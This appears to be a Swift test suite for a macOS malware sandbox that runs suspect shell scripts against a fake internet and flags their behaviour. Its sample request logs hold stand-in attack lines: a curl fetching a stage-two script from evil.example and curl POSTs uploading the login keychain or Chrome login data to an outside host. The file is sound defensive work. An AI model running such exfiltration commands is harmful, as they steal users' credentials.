import Foundation
import Testing

@testable import MacxCore

@Suite("Detonation chamber phase 2: fake internet and sleeps")
struct ChamberNetTests {
    let judge = ChamberJudge(guestHome: URL(fileURLWithPath: ChamberImage.guestHome))
    let home = ChamberImage.guestHome

    @Test func readsTheStandInsRequestLog() {
        let log = [
            "curl\tGET\thttps://evil.example/stage2.sh\t/tmp/s2.sh",
            "curl\tPOST\thttps://203.0.113.9/up\t\t\(home)/Library/Keychains/login.keychain-db\tnotes.zip",
            "wget\t\thttp://evil.example/x\t-",
            "curl\tGET\tfile:///etc/passwd\t",  // not http(s)
            "nc\tGET\thttps://x\t",  // not a stand-in
            "junk",
        ].joined(separator: "\n")
        let r = ChamberRequest.parse(log)
        #expect(r.count == 3)
        #expect(r[0] == ChamberRequest(tool: "curl", method: "GET", url: "https://evil.example/stage2.sh", output: "/tmp/s2.sh"))
        #expect(r[1].uploads == ["\(home)/Library/Keychains/login.keychain-db", "notes.zip"])
        #expect(r[2].method == "GET")
    }

    @Test func uploadingBaitIsCritical() {
        let up = ChamberRequest(
            tool: "curl", method: "POST", url: "https://203.0.113.9/up", uploads: ["\(home)/Library/Keychains/login.keychain-db"])
        let a = judge.networkAndSleepRules(requests: [up], sleeps: [])
        #expect(a.contains { $0.rule == "uploads-stolen-data" && $0.severity == .critical && $0.detail?.contains("203.0.113.9") == true })
        let chrome = ChamberRequest(
            tool: "curl", method: "POST", url: "https://x/u",
            uploads: ["\(home)/Library/Application Support/Google/Chrome/Default/Login Data"])
        #expect(judge.networkAndSleepRules(requests: [chrome], sleeps: []).map(\.rule) == ["uploads-stolen-data"])
    }

    @Test func sendingTheCanaryPasswordIsCritical() {
        let r = ChamberRequest(tool: "curl", method: "GET", url: "https://x/c?p=\(ChamberImage.canaryPassword)")
        #expect(judge.networkAndSleepRules(requests: [r], sleeps: []).contains { $0.rule == "uploads-stolen-data" })
    }

    @Test func ordinaryUploadsAndDownloadsAreNotStealing() {
        let r = [
            ChamberRequest(tool: "curl", method: "POST", url: "https://x/u", uploads: ["\(home)/Documents/notes.txt"]),
            ChamberRequest(tool: "curl", method: "GET", url: "https://x/a.sh"),
        ]
        #expect(judge.networkAndSleepRules(requests: r, sleeps: []).isEmpty)
    }

    @Test func longWaitsAreFlagged() {
        #expect(ChamberSleeps.parse("600\n1.5\nnope\n-3\n") == [600, 1.5])
        #expect(judge.networkAndSleepRules(requests: [], sleeps: [30, 40]).map(\.rule) == ["waits-before-acting"])
        #expect(judge.networkAndSleepRules(requests: [], sleeps: [1, 2, 5]).isEmpty)
    }

    @Test func followKeepsToItsLimits() {
        var answers = ChamberAnswers()
        let requests =
            (0..<15).map { ChamberRequest(tool: "curl", method: "GET", url: "https://x/\($0)") } + [
                ChamberRequest(tool: "curl", method: "POST", url: "https://x/up")
            ]
        let first = answers.toFetch(from: requests)
        #expect(first.count == ChamberAnswers.maxURLs)
        #expect(!first.contains("https://x/up"))  // uploads are never fetched
        for u in first {
            let kept = answers.add(url: u, body: Data("echo hi".utf8))
            #expect(kept)
        }
        #expect(answers.toFetch(from: requests).isEmpty)
        let extra = answers.add(url: "https://x/extra", body: Data())
        #expect(!extra)
        var big = ChamberAnswers()
        let tooBig = big.add(url: "https://x/big", body: Data(count: ChamberAnswers.maxBytesPerURL + 1))
        #expect(!tooBig)
        #expect(ChamberAnswers.key("https://x/1").count == 64)
    }
}

@Suite("Detonation chamber phase 2: installer packages")
struct ChamberPackageTests {
    @Test func findsFlatAndComponentScripts() throws {
        let tmp = try TempDir()
        let fm = FileManager.default
        for dir in ["Scripts", "Tool.pkg/Scripts", "Other.pkg"] {
            try fm.createDirectory(at: tmp.url.appendingPathComponent(dir), withIntermediateDirectories: true)
        }
        for f in ["Scripts/postinstall", "Tool.pkg/Scripts/preinstall", "Tool.pkg/Scripts/postinstall", "Tool.pkg/Scripts/helper"] {
            try Data("#!/bin/sh\n".utf8).write(to: tmp.url.appendingPathComponent(f))
        }
        let s = ChamberPackage.scripts(inExpanded: tmp.url)
        #expect(s.map { "\($0.component)/\($0.phase.rawValue)" } == ["/postinstall", "Tool.pkg/preinstall", "Tool.pkg/postinstall"])
        #expect(PackageScript.arguments(packageName: "Setup.pkg") == ["/tmp/Setup.pkg", "/Applications", "/"])
    }

    @Test func notBuiltYetSaysWhereThePlanIs() {
        #expect(ChamberPhase2Error.notBuiltYet("--follow").description.contains("PHASE2.md"))
    }
}

@Suite("One chamber run for the command line and the app")
struct ChamberSessionTests {
    @Test func refusesUntilTheChamberIsSetUp() throws {
        let tmp = try TempDir()
        let script = tmp.url.appendingPathComponent("x.sh")
        try Data("#!/bin/sh\necho hi\n".utf8).write(to: script)
        #expect(throws: ChamberSession.Problem.notSetUp) {
            try ChamberSession.run(script, store: ChamberStore(root: tmp.url.appendingPathComponent("none")), feed: nil)
        }
        #expect(ChamberSession.Problem.notSetUp.description.contains("macx chamber setup"))
    }

    @Test func takesShellScriptsButNotProgramsOrCompiledAppleScript() throws {
        let tmp = try TempDir()
        let sh = tmp.url.appendingPathComponent("a.sh")
        try Data("#!/bin/bash\necho hi\n".utf8).write(to: sh)
        #expect(ChamberSession.canRun(sh))
        #expect(!ChamberSession.canRun(URL(fileURLWithPath: "/bin/ls")))
        let scpt = tmp.url.appendingPathComponent("a.scpt")
        try Data("FasdUAS 1.101.10".utf8).write(to: scpt)
        #expect(!ChamberSession.canRun(scpt))
        #expect(!ChamberSession.canRun(tmp.url.appendingPathComponent("missing.sh")))
    }
}

@Suite("Chamber stages for the status bar")
struct ChamberStageTests {
    @Test func everyStageSaysWhatsHappening() {
        let stages: [ChamberSession.Stage] = [.preparing, .building, .booting, .running(limit: 60), .judging]
        #expect(Set(stages.map(\.label)).count == stages.count)
        #expect(ChamberSession.Stage.running(limit: 60).label.contains("60 s"))
    }
}
